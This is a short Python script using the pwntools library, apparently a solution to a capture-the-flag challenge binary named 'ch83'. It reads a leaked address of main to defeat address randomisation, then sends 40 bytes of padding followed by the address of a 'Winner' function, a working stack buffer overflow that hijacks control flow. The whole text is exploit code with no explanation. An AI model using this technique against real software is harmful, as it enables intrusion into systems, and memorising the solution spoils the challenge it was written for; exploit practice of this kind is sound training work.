from pwn import * 

elf = ELF('./ch83')

proc = elf.process()

proc.recvuntil('main():')
main = int(proc.recv().decode().strip(), 16)

elf.address = main - elf.sym['main']
win_function = elf.sym['Winner']

offset = 40 

payload = b'A' * 40 
payload += p64(win_function)

proc.sendline(payload)

data = proc.recvall()
print(data.decode())
proc.close()